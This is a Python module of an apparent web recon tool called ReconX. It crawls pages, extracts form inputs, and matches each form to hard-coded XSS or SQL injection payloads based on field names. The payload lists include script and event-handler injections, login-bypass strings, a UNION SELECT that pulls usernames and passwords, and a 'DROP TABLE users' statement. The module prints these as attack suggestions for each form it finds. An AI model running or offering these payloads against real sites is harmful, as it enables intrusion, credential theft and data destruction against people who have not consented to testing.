"""
Module C — Contextual XSS / SQLi Payload Suggester
"""
import requests
from bs4 import BeautifulSoup

HEADERS = {"User-Agent": "ReconX/1.0 (security research)"}

# ── Payload libraries ──────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '"><script>alert(document.domain)</script>',
    "'><img src=x onerror=alert(1)>",
    "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    '"><details/open/ontoggle=confirm(1)>',
    "<svg><animatetransform onbegin=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1' -- ",
    "\" OR 1=1 -- ",
    "' UNION SELECT NULL,username,password FROM users -- ",
    "admin'/*",
    "1; DROP TABLE users -- ",
]

# Context-specific payload sets keyed by common input name hints
CONTEXT_MAP = {
    "search":   {"type": "XSS", "payloads": XSS_PAYLOADS},
    "q":        {"type": "XSS", "payloads": XSS_PAYLOADS},
    "query":    {"type": "XSS", "payloads": XSS_PAYLOADS},
    "username": {"type": "SQLi", "payloads": SQLI_PAYLOADS},
    "user":     {"type": "SQLi", "payloads": SQLI_PAYLOADS},
    "email":    {"type": "SQLi", "payloads": SQLI_PAYLOADS},
    "password": {"type": "SQLi", "payloads": SQLI_PAYLOADS},
    "pass":     {"type": "SQLi", "payloads": SQLI_PAYLOADS},
    "login":    {"type": "SQLi", "payloads": SQLI_PAYLOADS},
    "id":       {"type": "SQLi", "payloads": SQLI_PAYLOADS},
}


def _choose_payloads(inputs: list[dict]) -> dict:
    """
    Examine parsed inputs and pick the most contextually relevant payload set.
    Falls back to XSS payloads if no specific context is detected.
    """
    for inp in inputs:
        name = (inp.get("name") or inp.get("id") or "").lower()
        for hint, ctx in CONTEXT_MAP.items():
            if hint in name:
                return ctx
    return {"type": "XSS (generic)", "payloads": XSS_PAYLOADS}


def _parse_forms(html: str, base_url: str) -> list[dict]:
    """Extract forms and their inputs from raw HTML."""
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        inputs = []
        for inp in form.find_all(["input", "textarea", "select"]):
            inputs.append({
                "tag":   inp.name,
                "name":  inp.get("name", ""),
                "id":    inp.get("id", ""),
                "type":  inp.get("type", "text"),
            })
        forms.append({
            "action": form.get("action") or base_url,
            "method": form.get("method", "get").upper(),
            "inputs": inputs,
        })
    return forms


def run(urls: list[dict], log_fn=print) -> list[dict]:
    """
    Fetch each 200-OK URL, detect forms, and suggest payloads.

    Args:
        urls:    List of {url, status_code, content_length} dicts from Module B.
        log_fn:  Callable for progress logging.

    Returns:
        List of dicts containing form details and payload suggestions.
    """
    ok_urls = [u for u in urls if u.get("status_code") == 200]
    log_fn(f"[MODULE C] Analysing {len(ok_urls)} 200-OK URL(s) for input forms")

    all_results: list[dict] = []

    for entry in ok_urls:
        url = entry["url"]
        log_fn(f"[MODULE C] → Fetching {url}")
        try:
            resp = requests.get(url, headers=HEADERS, timeout=10)
            resp.raise_for_status()
        except requests.exceptions.RequestException as exc:
            log_fn(f"  ✗ Could not fetch: {exc}")
            continue

        forms = _parse_forms(resp.text, url)
        if not forms:
            log_fn("  ─ No input forms detected, skipping")
            continue

        log_fn(f"  ✓ {len(forms)} form(s) detected")
        for form in forms:
            ctx = _choose_payloads(form["inputs"])
            suggestion = {
                "url":       url,
                "form_action": form["action"],
                "method":    form["method"],
                "inputs":    form["inputs"],
                "payload_type": ctx["type"],
                "payloads":  ctx["payloads"],
            }
            all_results.append(suggestion)
            log_fn(f"    Form → {form['action']} [{form['method']}]")
            log_fn(f"    Attack type: {ctx['type']}")
            for i, pl in enumerate(ctx["payloads"], 1):
                log_fn(f"    Payload {i}: {pl}")

    log_fn(f"[MODULE C] Done — {len(all_results)} form(s) with payload suggestion(s)")
    return all_results
